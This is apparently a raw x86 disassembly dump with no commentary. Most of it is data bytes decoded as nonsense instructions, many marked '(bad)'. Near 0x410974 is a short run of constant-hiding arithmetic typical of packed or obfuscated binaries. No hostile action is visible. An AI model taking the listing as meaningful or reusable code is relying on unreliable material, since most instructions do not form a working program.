  41027e:	pusha  
  41027f:	repz es shr edx,1
  410283:	mov    ds:0xed197e71,al
  410288:	iret   
  410289:	ret    
  41028a:	aad    0x6b
  41028c:	outs   dx,BYTE PTR ds:[esi]
  41028d:	scas   al,BYTE PTR es:[edi]
  41028e:	pop    ecx
  41028f:	daa    
  410290:	mov    bl,0x5a
  410292:	pop    ebx
  410293:	mov    DWORD PTR [edi+0x36a67d81],0xd581b311
  41029d:	les    eax,FWORD PTR [esi+eiz*2+0x6a6aa969]
  4102a4:	cld    
  4102a5:	pop    esi
  4102a6:	out    dx,eax
  4102a7:	jge    0x4102ce
  4102a9:	repnz dec dl
  4102ac:	fisttp DWORD PTR [ecx+0x1c]
  4102af:	fld    st(2)
  4102b1:	push   0x63c57dcc
  4102b6:	repz jmp 0x2b582cae
  4102bc:	lds    edi,FWORD PTR [ebx+0x2cee6541]
  4102c2:	lock mov esp,0xc6e45914
  4102c8:	cdq    
  4102c9:	cmp    BYTE PTR [ebp+0x496287e4],bl
  4102cf:	jl     0x410338
  4102d1:	mov    dl,BYTE PTR [esi-0x2c]
  4102d4:	neg    BYTE PTR [esi]
  4102d6:	popa   
  4102d7:	ja     0x4102fa
  4102d9:	imul   eax,DWORD PTR [edx+0x16],0xe1bd5f62
  4102e0:	hlt    
  4102e1:	mov    ds:0x836a8f14,al
  4102e6:	jnp    0x4102d7
  4102e8:	(bad)  
  4102e9:	add    ebx,DWORD PTR [ebx+0x6a]
  4102ec:	shl    DWORD PTR [ebx],cl
  4102ee:	fcmovnu st,st(4)
  4102f0:	mov    edi,0x9433ef39
  4102f5:	jnp    0x410284
  4102f7:	jp     0x4102d3
  4102f9:	jae    0x410342
  4102fb:	mov    eax,ds:0xea7851e0
  410300:	loope  0x410339
  410302:	xchg   ebp,eax
  410303:	lods   eax,DWORD PTR ds:[esi]
  410304:	and    al,0x53
  410306:	xor    DWORD PTR [ecx],esp
  410308:	in     eax,0x80
  41030a:	dec    esi
  41030b:	add    bh,BYTE PTR [edx-0x3cd73f49]
  410311:	test   DWORD PTR [ecx+0x25a6953e],esi
  410317:	popf   
  410318:	xchg   esi,esi
  41031a:	xor    DWORD PTR [edx],edx
  41031c:	mov    esp,0xd91df9a
  410321:	or     al,0xd
  410323:	fcom   st(5)
  410325:	mov    ebx,0x8e17800c
  41032a:	pop    edx
  41032b:	sub    ebp,DWORD PTR [ecx-0x54]
  41032e:	es xchg edx,eax
  410330:	fidivr DWORD PTR ds:0xdba827a4
  410336:	out    dx,al
  410337:	adc    ch,BYTE PTR [edx+0x56]
  41033a:	inc    edi
  41033b:	dec    esp
  41033c:	ficomp DWORD PTR [edi-0x1f]
  41033f:	and    ah,BYTE PTR [ebx-0x1b9769bc]
  410345:	ds das 
  410347:	ins    BYTE PTR es:[edi],dx
  410348:	add    edx,0xffffffba
  41034b:	popw   es
  41034d:	jl     0x410302
  41034f:	or     BYTE PTR [eax-0x1f205ef9],al
  410355:	arpl   WORD PTR [di-0x2b],sp
  410359:	fistp  WORD PTR [ebx+0x2d]
  41035c:	imul   DWORD PTR [edx]
  41035e:	lea    edx,[eax+eiz*8+0x3048b863]
  410365:	clc    
  410366:	jns    0x4103ca
  410368:	aaa    
  410369:	dec    ebp
  41036a:	xchg   esi,esp
  41036c:	pop    edi
  41036d:	dec    esi
  41036e:	mov    al,0x99
  410370:	adc    BYTE PTR [ecx+0x29],dl
  410373:	in     al,dx
  410374:	dec    esp
  410375:	rcr    BYTE PTR [ebp+ebx*4-0x75],0xe8
  41037a:	push   es
  41037b:	or     al,0x97
  41037d:	pop    edx
  41037e:	in     eax,dx
  41037f:	jp     0x4103bd
  410381:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410382:	iret   
  410383:	sub    al,0xc2
  410385:	xlat   BYTE PTR ds:[ebx]
  410386:	push   0xffffffc8
  410388:	in     eax,dx
  410389:	push   0x59
  41038b:	dec    ebx
  41038c:	push   cs
  41038d:	jmp    0xbad97a72
  410392:	push   cs
  410393:	(bad)  
  410394:	and    DWORD PTR ds:0x5821c1b9,ecx
  41039a:	ja     0x410372
  41039c:	in     al,0xf8
  41039e:	mov    edx,0xab8ef16a
  4103a3:	fwait
  4103a4:	mov    al,0xb9
  4103a6:	xor    al,BYTE PTR [edi]
  4103a8:	mov    al,0xbf
  4103aa:	mov    al,0xea
  4103ac:	adc    BYTE PTR [ebp+0x2a],al
  4103af:	xchg   esi,eax
  4103b0:	mov    BYTE PTR [edx],dh
  4103b2:	(bad)  
  4103b3:	adc    BYTE PTR [edi],bl
  4103b5:	fidiv  WORD PTR [ecx]
  4103b7:	sbb    ch,ah
  4103b9:	push   ebp
  4103ba:	xor    eax,0x217aa17d
  4103bf:	sub    DWORD PTR [esi-0x61],edx
  4103c2:	sbb    ch,BYTE PTR [ebp+0x6c5e8778]
  4103c8:	cld    
  4103c9:	fld    DWORD PTR [ebx-0x4337febf]
  4103cf:	xlat   BYTE PTR ds:[ebx]
  4103d0:	(bad)  
  4103d1:	loopne 0x4103de
  4103d3:	inc    edi
  4103d4:	je     0x4103bf
  4103d6:	fiadd  DWORD PTR [esi]
  4103d8:	add    DWORD PTR [ebp-0x76],ebx
  4103db:	adc    dh,dh
  4103dd:	aas    
  4103de:	add    ebp,DWORD PTR [eax+0x14]
  4103e1:	imul   DWORD PTR [ecx+0x2f6e30fe]
  4103e7:	cmp    BYTE PTR [edx-0x789ca233],bl
  4103ed:	aas    
  4103ee:	in     eax,0x3b
  4103f0:	fnstsw WORD PTR [ecx-0x2e019205]
  4103f6:	aaa    
  4103f7:	aas    
  4103f8:	mov    ebx,0xa6ba2d9e
  4103fd:	inc    ecx
  4103fe:	jbe    0x41044c
  410400:	jg     0x4103d0
  410402:	cli    
  410403:	jnp    0x410470
  410405:	adc    DWORD PTR [esi+0x5f8b47e1],esp
  41040b:	add    al,0xba
  41040d:	sub    BYTE PTR [edx+0x66],dh
  410410:	dec    ebx
  410411:	jmp    DWORD PTR [ebx]
  410413:	or     eax,0xccc051ee
  410418:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410419:	fnsave [ecx+0x25]
  41041c:	loope  0x4103dd
  41041e:	fwait
  41041f:	push   es
  410420:	test   eax,0x8a49b59d
  410425:	popa   
  410426:	pop    edi
  410427:	push   0xffffffc6
  410429:	sbb    edx,DWORD PTR [ebx+0x43]
  41042c:	sub    BYTE PTR es:[ebx-0xa],ch
  410430:	pop    eax
  410431:	xchg   ebp,eax
  410432:	push   eax
  410433:	add    BYTE PTR [esi-0x4d0fe5e6],ch
  410439:	inc    edi
  41043a:	jbe    0x41047a
  41043c:	int    0xfd
  41043e:	bound  esi,QWORD PTR [ecx+0x6c19283a]
  410444:	pusha  
  410445:	mov    cl,0xdd
  410447:	cmp    ch,BYTE PTR [ecx]
  410449:	pop    DWORD PTR [ebx-0x76]
  41044c:	out    0xe1,al
  41044e:	push   ecx
  41044f:	sbb    bl,BYTE PTR ss:[ebx-0x4d27968a]
  410456:	test   edx,ebp
  410458:	lods   al,BYTE PTR ds:[esi]
  410459:	adc    ecx,DWORD PTR [edi]
  41045b:	repz pop esp
  41045d:	jmp    0x9e52:0xb904260f
  410464:	xchg   BYTE PTR ds:0x4e0faa48,bh
  41046a:	mov    DWORD PTR [ecx+0x14],edx
  41046d:	jmp    0x4104a2
  41046f:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  410471:	fnstcw WORD PTR ds:0xe257eebd
  410477:	mov    al,ds:0xbed5b679
  41047c:	push   0x81f1299d
  410481:	pop    es
  410482:	bound  esp,QWORD PTR [ecx-0x53]
  410485:	add    eax,0x902c585e
  41048a:	fstp   QWORD PTR [eax+0x292e4e41]
  410490:	mov    edx,0x185c2af1
  410495:	retf   
  410496:	jb     0x4104a8
  410498:	sub    eax,0xcad35494
  41049d:	outs   dx,BYTE PTR ds:[si]
  41049f:	(bad)  
  4104a0:	imul   dl
  4104a2:	xchg   esp,eax
  4104a3:	adc    edi,eax
  4104a5:	and    esi,DWORD PTR [eax+0x5ed9d68]
  4104ab:	dec    edx
  4104ac:	sti    
  4104ad:	mov    ?,WORD PTR [ebx+0x81f1c95]
  4104b3:	jg     0x41050d
  4104b5:	in     eax,0x36
  4104b7:	inc    esp
  4104b8:	in     eax,0x79
  4104ba:	ja     0x4104ea
  4104bc:	fbld   TBYTE PTR [esi+0x46]
  4104bf:	out    0x8a,eax
  4104c1:	call   0xd33fae92
  4104c6:	dec    esp
  4104c7:	and    esi,edx
  4104c9:	retf   0xe145
  4104cc:	sti    
  4104cd:	mov    esi,ebp
  4104cf:	les    edi,FWORD PTR [ecx+edi*8-0x15]
  4104d3:	mov    al,ds:0x3511e05f
  4104d8:	fwait
  4104d9:	shl    DWORD PTR [eax],cl
  4104db:	ss push edx
  4104dd:	int    0x29
  4104df:	lahf   
  4104e0:	xchg   ecx,eax
  4104e1:	icebp  
  4104e2:	jno    0x410484
  4104e4:	scas   al,BYTE PTR es:[edi]
  4104e5:	dec    esi
  4104e6:	xchg   edi,eax
  4104e7:	pop    esi
  4104e8:	lds    ebp,FWORD PTR [eax]
  4104ea:	dec    ebx
  4104eb:	add    eax,0x74c79a02
  4104f0:	pop    ebp
  4104f1:	jg     0x41050a
  4104f3:	push   ecx
  4104f4:	xor    DWORD PTR [ebx],esi
  4104f6:	push   0x292d24cf
  4104fb:	(bad)  
  4104fc:	dec    esp
  4104fd:	push   ecx
  4104fe:	mov    WORD PTR [ecx],ds
  410500:	fs sub edi,eax
  410503:	fwait
  410504:	xor    al,0x2
  410506:	and    al,0x5d
  410508:	add    al,0x8
  41050a:	sbb    bl,bh
  41050c:	push   eax
  41050d:	xor    esp,DWORD PTR [ebx+0x73]
  410510:	popa   
  410511:	adc    al,0x2d
  410513:	mov    ecx,esi
  410515:	add    eax,0xaaa4b31b
  41051a:	imul   esi,ebp,0xffffffda
  41051d:	sbb    al,0xf1
  41051f:	addr16 mov ecx,0xf4c4d6bb
  410525:	dec    edi
  410526:	or     ecx,DWORD PTR [esi]
  410528:	test   ecx,edx
  41052a:	loopne 0x4104b4
  41052c:	pop    ss
  41052d:	xchg   ebp,eax
  41052e:	pop    ecx
  41052f:	cwde   
  410530:	mov    ebx,ebx
  410532:	sub    ah,BYTE PTR [esi-0x451e6959]
  410538:	pop    ds
  410539:	lods   al,BYTE PTR ds:[esi]
  41053a:	sub    DWORD PTR [esi-0xa4fdd2],ebx
  410540:	std    
  410541:	pop    esi
  410542:	pop    edi
  410543:	retf   
  410544:	inc    ecx
  410545:	inc    esi
  410546:	mov    dh,0x48
  410548:	push   cs
  410549:	inc    ecx
  41054a:	jne    0x410540
  41054c:	sub    ebp,DWORD PTR [edx]
  41054e:	sti    
  41054f:	data16 into 
  410551:	lock imul esp,DWORD PTR [ebp-0x6735e35e],0x1422000
  41055c:	int    0xf8
  41055e:	push   ecx
  41055f:	mov    dl,0x7a
  410561:	push   ecx
  410562:	push   ss
  410563:	xor    dl,BYTE PTR [ecx]
  410565:	pop    ebp
  410566:	enter  0xbda3,0xce
  41056a:	adc    ebx,DWORD PTR [eax-0x7b]
  41056d:	ror    BYTE PTR [edi],0x84
  410570:	mov    ss,WORD PTR [eax+eax*1]
  410573:	add    BYTE PTR [ecx-0x1016238b],cl
  410579:	add    eax,DWORD PTR [eax]
  41057b:	add    ch,ah
  41057d:	out    0x6f,al
  41057f:	pop    ebp
  410580:	outs   dx,DWORD PTR ds:[esi]
  410581:	jne    0x410578
  410583:	data16 hlt 
  410585:	test   ebx,eax
  410587:	pushf  
  410588:	sbb    esp,edi
  41058a:	mov    ds:0x70bf0a4a,eax
  41058f:	jo     0x4105da
  410591:	jge    0x410603
  410593:	jo     0x4105d7
  410595:	mov    BYTE PTR [ebp+0x71cb1666],0x58
  41059c:	retf   
  41059d:	jne    0x410520
  41059f:	nop
  4105a0:	sbb    edi,DWORD PTR [edi+ebp*2+0x67]
  4105a4:	sbb    ebp,DWORD PTR [edi]
  4105a6:	or     ebp,ecx
  4105a8:	je     0x41058e
  4105aa:	into   
  4105ab:	jg     0x4105fa
  4105ad:	fistp  DWORD PTR [eax+0x2a310287]
  4105b3:	ret    0x2311
  4105b6:	out    dx,al
  4105b7:	and    al,0x59
  4105b9:	or     BYTE PTR [edi+ebp*8+0x2d],cl
  4105bd:	dec    ecx
  4105be:	fs push cs
  4105c0:	fucomi st,st(2)
  4105c2:	out    0xfe,al
  4105c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105c5:	jo     0x410548
  4105c7:	ficom  DWORD PTR [edi+0x6e]
  4105ca:	push   cs
  4105cb:	jecxz  0x4105d2
  4105cd:	jnp    0x48ca4b2d
  4105d3:	mov    dl,0x88
  4105d5:	data16 fmul QWORD PTR [edi]
  4105d8:	xchg   edi,eax
  4105d9:	cld    
  4105da:	ret    
  4105db:	into   
  4105dc:	mov    eax,0xa0241fce
  4105e1:	enter  0xefc3,0x4e
  4105e5:	jp     0x4105df
  4105e7:	std    
  4105e8:	and    cl,BYTE PTR [ecx]
  4105ea:	jae    0x4105db
  4105ec:	pop    eax
  4105ed:	cs mov dl,0xf9
  4105f0:	leave  
  4105f1:	retf   
  4105f2:	outs   dx,DWORD PTR ds:[esi]
  4105f3:	jb     0x4105c2
  4105f5:	iret   
  4105f6:	push   esp
  4105f7:	stos   DWORD PTR es:[edi],eax
  4105f8:	lahf   
  4105f9:	sar    DWORD PTR [ecx],1
  4105fb:	stc    
  4105fc:	lahf   
  4105fd:	std    
  4105fe:	inc    esi
  4105ff:	cld    
  410600:	mov    ch,BYTE PTR [edx+0x54]
  410603:	test   BYTE PTR [eax+0x7cb1307a],dh
  410609:	mov    esi,0xfc905066
  41060e:	shl    DWORD PTR [eax+ebp*2],cl
  410611:	int    0x2c
  410613:	xchg   ebx,eax
  410614:	mov    WORD PTR [ecx+ebp*4-0x426b3022],es
  41061b:	jle    0x410613
  41061d:	mov    eax,ss:0x979bdd20
  410623:	pop    ecx
  410624:	jne    0x410687
  410626:	add    al,0x8c
  410628:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410629:	(bad)  
  41062a:	enter  0xe3cf,0xe0
  41062e:	(bad)  
  41062f:	in     eax,0x35
  410631:	jmp    0x283e:0x1ee0ab2b
  410638:	das    
  410639:	cmp    eax,0x429f6d8b
  41063e:	cmp    cl,bh
  410640:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410641:	mov    ebp,DWORD PTR [eax]
  410643:	je     0x41065d
  410645:	push   ebx
  410646:	pop    ss
  410647:	and    eax,0xc94c1bf8
  41064c:	icebp  
  41064d:	call   0xfe78:0x9dfbbeed
  410654:	into   
  410655:	mov    WORD PTR [ebx+0x65db6caa],ss
  41065b:	sbb    eax,DWORD PTR [ecx-0x3e624339]
  410661:	les    eax,FWORD PTR [esi-0x7]
  410664:	cmp    BYTE PTR [esi],ah
  410666:	mov    bh,0x24
  410668:	sub    BYTE PTR [ecx-0x55],ah
  41066b:	mov    ch,0x2f
  41066d:	dec    eax
  41066e:	and    edi,DWORD PTR [esi+0x3]
  410671:	mov    edx,0x3513e2c6
  410676:	cmp    dl,dh
  410678:	scas   al,BYTE PTR es:[edi]
  410679:	add    ah,bh
  41067b:	mov    bh,0x52
  41067d:	add    eax,0x41c75795
  410682:	mov    ebp,0x3e9d8116
  410687:	sti    
  410688:	inc    ebx
  410689:	stc    
  41068a:	jmp    0x41067c
  41068c:	call   0x74df:0xb1846ccc
  410693:	sbb    al,0xe3
  410695:	call   0x40cf:0xd9a075b1
  41069c:	int    0xbb
  41069e:	push   ss
  41069f:	(bad)  
  4106a0:	sub    BYTE PTR [esi],0x49
  4106a3:	push   ecx
  4106a4:	jmp    0x410669
  4106a6:	mov    cl,al
  4106a8:	enter  0xe000,0x99
  4106ac:	(bad)  
  4106ad:	pusha  
  4106ae:	int3   
  4106af:	out    0x9d,al
  4106b1:	jge    0x410706
  4106b3:	call   0x7937a786
  4106b8:	jmp    0x4106ec
  4106ba:	push   ebp
  4106bb:	loopne 0x4106c4
  4106bd:	dec    edx
  4106be:	add    DWORD PTR gs:[edi-0x4b],ebx
  4106c2:	out    0xc2,al
  4106c4:	int    0xab
  4106c6:	jg     0x41069b
  4106c8:	sbb    DWORD PTR [eax+eax*4],0xffffffab
  4106cc:	or     bl,BYTE PTR [ebx-0x3a55a1a4]
  4106d2:	mov    dh,0xb3
  4106d4:	add    eax,0x7662164a
  4106d9:	cmp    BYTE PTR [esi],bh
  4106db:	addr16 inc ebx
  4106dd:	fsubr  DWORD PTR [esi+0x8]
  4106e0:	pop    eax
  4106e1:	sar    DWORD PTR [edx-0x65],cl
  4106e4:	shl    DWORD PTR [ebx],1
  4106e6:	fldenv [eax]
  4106e8:	fild   DWORD PTR [ebp+0x6a]
  4106eb:	xchg   ebx,eax
  4106ec:	xor    al,0x35
  4106ee:	and    al,BYTE PTR [ebp-0x551a207e]
  4106f4:	call   0xc182b6e
  4106f9:	push   esi
  4106fa:	add    al,0x88
  4106fc:	sbb    edi,0x13
  4106ff:	xchg   ebx,eax
  410700:	cs fwait
  410702:	mov    dh,BYTE PTR ds:0x928b09d7
  410708:	cmp    eax,0xabeeb7b7
  41070d:	mov    dh,0xfe
  41070f:	sub    al,0x8b
  410711:	mov    DWORD PTR [di+0x5c],edx
  410715:	fisttp WORD PTR ds:0x805af08c
  41071b:	inc    BYTE PTR [ebp-0x13]
  41071e:	sub    eax,0x7fdd1981
  410723:	(bad)  
  410724:	(bad)  
  410725:	shl    DWORD PTR [ebx-0x53ea829],cl
  41072b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41072c:	and    BYTE PTR [eax],bh
  41072e:	xor    DWORD PTR gs:[edi+0x7bc9d3b2],0x960bf4f
  410739:	mov    edx,0x6b7dad41
  41073e:	ficom  WORD PTR [edi+0x4d9f9a3b]
  410744:	and    bl,BYTE PTR [edx]
  410746:	adc    al,0xc8
  410748:	pop    edx
  410749:	add    al,0x59
  41074b:	add    eax,esp
  41074d:	daa    
  41074e:	rol    DWORD PTR [edx+0xf],0xd7
  410752:	and    al,0xf0
  410754:	push   esi
  410755:	mov    edx,0xd5b060ed
  41075a:	xor    bh,cl
  41075c:	aas    
  41075d:	mov    eax,edi
  41075f:	xchg   esi,eax
  410760:	rol    esi,1
  410762:	mov    esi,DWORD PTR [edx-0x3a05a62f]
  410768:	fidiv  DWORD PTR [esi+0xd52da29]
  41076e:	(bad)  
  41076f:	call   0xbee5:0x7259ca09
  410776:	imul   ecx,DWORD PTR [ecx+0x12d6c9b1],0x6
  41077d:	aas    
  41077e:	adc    BYTE PTR [esi+0x2e6b8969],ch
  410784:	mov    ds:0x9d8d681c,al
  410789:	imul   ebp,DWORD PTR [edi-0x19978a99],0x72
  410790:	or     dl,BYTE PTR ss:[edi]
  410793:	out    dx,eax
  410794:	stos   DWORD PTR es:[edi],eax
  410795:	mov    cl,0xfc
  410797:	jb     0x4107e1
  410799:	or     al,0x5f
  41079b:	or     al,0xfb
  41079d:	or     esi,0x3c
  4107a0:	or     eax,0x835a1de2
  4107a5:	ins    BYTE PTR es:[edi],dx
  4107a6:	mov    ebx,0xb937bfd
  4107ab:	mov    ?,edx
  4107ad:	jnp    0x41082b
  4107af:	pop    ecx
  4107b0:	sbb    DWORD PTR [eax+0x2c85552f],edx
  4107b6:	out    0x37,eax
  4107b8:	int    0x3f
  4107ba:	mov    ecx,0x670c8a1f
  4107bf:	inc    ebp
  4107c0:	cmp    BYTE PTR [ecx+ecx*4-0x4caddee3],dl
  4107c7:	outs   dx,DWORD PTR ds:[esi]
  4107c8:	add    DWORD PTR [eax-0x30],0xfffffff8
  4107cc:	cld    
  4107cd:	jecxz  0x4107dc
  4107cf:	bnd jae 0x410762
  4107d2:	es add al,0x74
  4107d5:	scas   eax,DWORD PTR es:[edi]
  4107d6:	std    
  4107d7:	jno    0x4107c9
  4107d9:	out    dx,al
  4107da:	add    BYTE PTR [edi],al
  4107dc:	sub    al,0x42
  4107de:	lahf   
  4107df:	push   eax
  4107e0:	sbb    ebp,edi
  4107e2:	in     eax,0x4c
  4107e4:	sbb    ch,bl
  4107e6:	lods   al,BYTE PTR ds:[esi]
  4107e7:	mov    ecx,0xf4453cdd
  4107ec:	idiv   BYTE PTR [ebx]
  4107ee:	jle    0x410813
  4107f0:	jle    0x410813
  4107f2:	scas   al,BYTE PTR es:[edi]
  4107f3:	add    al,BYTE PTR [edx]
  4107f5:	cmp    esi,ebx
  4107f7:	in     eax,0x7f
  4107f9:	adc    esp,DWORD PTR [ebp+0x1a]
  4107fc:	jl     0x410798
  4107fe:	jle    0x4107ce
  410800:	out    0x29,eax
  410802:	outs   dx,DWORD PTR ds:[esi]
  410803:	data16 aam 0x75
  410806:	fbld   TBYTE PTR [edi+0x7b99f114]
  41080c:	jae    0x41081c
  41080e:	addr16 pop esi
  410810:	js     0x4107aa
  410812:	imul   edi,DWORD PTR [ecx-0x52],0x10
  410816:	pop    esi
  410817:	call   0x1382cacf
  41081c:	inc    esi
  41081d:	scas   al,BYTE PTR es:[edi]
  41081e:	scas   al,BYTE PTR es:[edi]
  41081f:	mov    edi,0xf274a257
  410824:	sbb    al,0xd1
  410826:	mov    eax,ds:0xce99f326
  41082b:	dec    ebx
  41082c:	out    dx,al
  41082d:	inc    ecx
  41082e:	mov    ds:0xe45b106f,eax
  410833:	jo     0x4107b7
  410835:	inc    eax
  410836:	mov    es,WORD PTR [esi+0x74fcbe3a]
  41083c:	int    0xe2
  41083e:	inc    esi
  41083f:	popa   
  410840:	jae    0x41089d
  410842:	(bad)  
  410844:	fs push edx
  410846:	inc    esi
  410847:	(bad)  
  410848:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410849:	daa    
  41084a:	in     al,dx
  41084b:	mov    WORD PTR [ecx],?
  41084d:	cmp    eax,0x623cf0ed
  410852:	scas   eax,DWORD PTR es:[edi]
  410853:	push   ebx
  410854:	mov    eax,ds:0xd3613c4
  410859:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41085a:	jmp    0x4d4d:0xf1a5c47b
  410861:	mov    eax,0x5b00303c
  410866:	sbb    cl,BYTE PTR [ebx+edx*4-0x37830961]
  41086d:	retf   0xebaa
  410870:	jnp    0x4108b9
  410872:	hlt    
  410873:	jne    0x4108f1
  410875:	outs   dx,BYTE PTR ds:[esi]
  410876:	sahf   
  410877:	js     0x41084d
  410879:	mov    ebp,0x289b45be
  41087e:	les    ecx,FWORD PTR [edi]
  410880:	jno    0x41087e
  410882:	ja     0x4108df
  410884:	(bad)  
  410885:	and    cl,BYTE PTR [edi]
  410887:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410888:	jne    0x410839
  41088a:	das    
  41088b:	mov    ds:0xd6aba9e4,al
  410890:	arpl   sp,si
  410892:	int3   
  410893:	adc    BYTE PTR [ebp+0x4ac54f0a],0x33
  41089a:	loop   0x41090a
  41089c:	pop    ebp
  41089d:	das    
  41089e:	std    
  41089f:	push   0x6d
  4108a1:	test   DWORD PTR [eax+0x40770d21],ebp
  4108a7:	jnp    0x4108dd
  4108a9:	in     al,dx
  4108aa:	sahf   
  4108ab:	lock hlt 
  4108ad:	loopne 0x410886
  4108af:	call   0x51d6ac1b
  4108b4:	sub    DWORD PTR ds:0xa8216f7e,ecx
  4108ba:	and    eax,edi
  4108bc:	test   al,0x7e
  4108be:	ror    BYTE PTR [edx-0x46751329],1
  4108c4:	scas   eax,DWORD PTR es:[edi]
  4108c5:	mov    eax,ds:0xda5b9b8e
  4108ca:	or     al,0x84
  4108cc:	xchg   esp,eax
  4108cd:	jnp    0x4108b3
  4108cf:	mov    esp,0xbee4b5e1
  4108d4:	(bad)  
  4108d5:	clc    
  4108d6:	(bad)  
  4108d7:	pop    ss
  4108d8:	enter  0x2e58,0x30
  4108dc:	fs mov ebp,0xb42e1831
  4108e2:	repz mov dl,0x27
  4108e5:	pop    esi
  4108e6:	int    0x27
  4108e8:	in     eax,0x40
  4108ea:	into   
  4108eb:	fist   DWORD PTR [ecx]
  4108ed:	call   0x88782dfe
  4108f2:	or     eax,0xb6aac3f4
  4108f7:	mov    ebp,0x9587cf91
  4108fc:	(bad)
  410900:	ret    
  410901:	or     ch,BYTE PTR [ecx+0x1c]
  410904:	sar    edx,cl
  410906:	mov    esi,0x6e3a429f
  41090b:	icebp  
  41090c:	inc    ebx
  41090d:	fdivr  QWORD PTR [ecx+0x4f]
  410910:	nop
  410911:	xchg   esi,eax
  410912:	and    BYTE PTR [eax-0x3e],ch
  410915:	sar    bl,1
  410917:	dec    esp
  410918:	pop    eax
  410919:	cwde   
  41091a:	enter  0x3090,0xc0
  41091e:	addr16 daa 
  410920:	je     0x4108e9
  410922:	aad    0xa
  410924:	stos   DWORD PTR es:[edi],eax
  410925:	push   ebx
  410926:	sbb    eax,0xf4479038
  41092b:	pop    ebx
  41092c:	aad    0x74
  41092e:	imul   eax,DWORD PTR [edi],0x40
  410931:	xchg   ebx,eax
  410932:	mov    dl,0xac
  410934:	xlat   BYTE PTR ds:[ebx]
  410935:	push   esi
  410936:	in     eax,0x97
  410938:	xlat   BYTE PTR ds:[ebx]
  410939:	outs   dx,BYTE PTR ds:[esi]
  41093a:	aam    0x5b
  41093c:	sub    al,0x5e
  41093e:	push   cs
  41093f:	sbb    ecx,ebx
  410941:	leave  
  410942:	or     eax,0x8c33ab37
  410947:	loope  0x4108e6
  410949:	outs   dx,DWORD PTR ds:[esi]
  41094a:	xor    DWORD PTR [eax-0x4f],ebp
  41094d:	cmp    DWORD PTR ds:0xf2b25c32,esp
  410953:	aaa    
  410954:	inc    ebx
  410955:	mov    edx,0x36ae005
  41095a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41095b:	mov    ch,0x2
  41095d:	mov    eax,0x4f91f925
  410962:	jne    0x4108f3
  410964:	push   esi
  410965:	fstp   DWORD PTR [edi+edx*1+0x6a92212f]
  41096c:	or     ebx,DWORD PTR [ecx+0x6a]
  41096f:	add    eax,0xcb875b49
  410974:	sub    ebx,ecx
  410976:	xchg   ebx,ecx
  410978:	dec    ecx
  410979:	mov    eax,DWORD PTR [ebp-0x1c]
  41097c:	imul   eax,ecx
  41097f:	sub    esp,eax
  410981:	mov    DWORD PTR [ebp-0x24],esp
  410984:	mov    eax,DWORD PTR [ebp-0x4]
  410987:	mov    ecx,0x7510855
  41098c:	xor    eax,ecx
  41098e:	mov    edx,0x32729c
  410993:	add    eax,edx
  410995:	mov    DWORD PTR [ebp+0x8],eax
  410998:	mov    eax,DWORD PTR [ebp-0x18]
  41099b:	xor    eax,ecx
  41099d:	add    eax,edx
  41099f:	mov    edx,DWORD PTR [ebp+0x14]
  4109a2:	imul   eax,DWORD PTR [edx]
  4109a5:	mov    edx,DWORD PTR [ebp-0x4]
  4109a8:	xor    edx,ecx
  4109aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4109ad:	lea    ecx,[edx+ecx*1+0x32729c]
  4109b4:	cmp    ecx,eax
  4109b6:	je     0x4119fd
  4109bc:	mov    edi,DWORD PTR [ebp-0x18]
  4109bf:	mov    eax,DWORD PTR [ebp+0x8]
  4109c2:	mov    edx,DWORD PTR [ebp+0x14]
  4109c5:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4109c9:	mov    ecx,0x7510855
  4109ce:	xor    edx,edx
  4109d0:	xor    edi,ecx
  4109d2:	mov    esi,0x32729c
  4109d7:	add    edi,esi
  4109d9:	div    edi
  4109db:	mov    edx,DWORD PTR [ebp-0x4]
  4109de:	xor    edx,ecx
  4109e0:	lea    eax,[edx+eax*1+0x32729c]
  4109e7:	mov    edx,DWORD PTR [ebp+0x8]
  4109ea:	mov    edi,DWORD PTR [ebp-0x24]
  4109ed:	mov    DWORD PTR [edi+edx*4],eax
  4109f0:	mov    eax,DWORD PTR [ebp-0x18]
  4109f3:	jmp    0x410de7
  4109f8:	ja     0x41099d
  4109fa:	mov    ecx,0x7175496f
  4109ff:	mov    ds:0xd6da6ce9,eax
  410a04:	mov    al,ds:0x63e13789
  410a09:	mov    esp,0x7d497070
  410a0e:	jo     0x410a80
  410a10:	xchg   esi,eax
  410a11:	and    dl,BYTE PTR [edx+edx*1-0x3f]
  410a15:	into   
  410a16:	cmc    
  410a17:	sub    al,ch
  410a19:	paddsw mm1,mm1
  410a1c:	aaa    
  410a1d:	dec    ebx
  410a1e:	loop   0x4109f0
  410a20:	pop    ebx
  410a21:	mov    DWORD PTR [esi-0x639ee9b9],eax
  410a27:	sti    
  410a28:	cmp    BYTE PTR [edx+0x291d1540],dh
  410a2e:	mov    eax,0xab636829
  410a33:	mov    esp,0x5872befd
  410a38:	cmc    
  410a39:	shr    edi,cl
  410a3b:	cs pop esp
  410a3d:	into   
  410a3e:	jmp    0x4109f5
  410a40:	pusha  
  410a41:	pop    ds
  410a42:	xchg   esp,eax
  410a43:	pushf  
  410a44:	aaa    
  410a45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a46:	sbb    bh,BYTE PTR [esi-0x33445dec]
  410a4c:	aam    0x6d
  410a4e:	mov    al,0x25
  410a50:	add    al,BYTE PTR [edi-0x5e]
  410a53:	pushf  
  410a54:	jbe    0x410a6d
  410a56:	test   DWORD PTR [eax+0x5],ebp
  410a59:	data16 ins BYTE PTR es:[edi],dx
  410a5b:	cwde   
  410a5c:	pop    esi
  410a5d:	test   DWORD PTR [ebx-0x63957214],edx
  410a63:	sti    
  410a64:	mov    eax,ds:0x2d8e8e9f
  410a69:	mov    dh,0x16
  410a6b:	retf   0x2d17
  410a6e:	(bad)  
  410a6f:	mov    ss,eax
  410a71:	shl    DWORD PTR [ebp+0x356a8cd],1
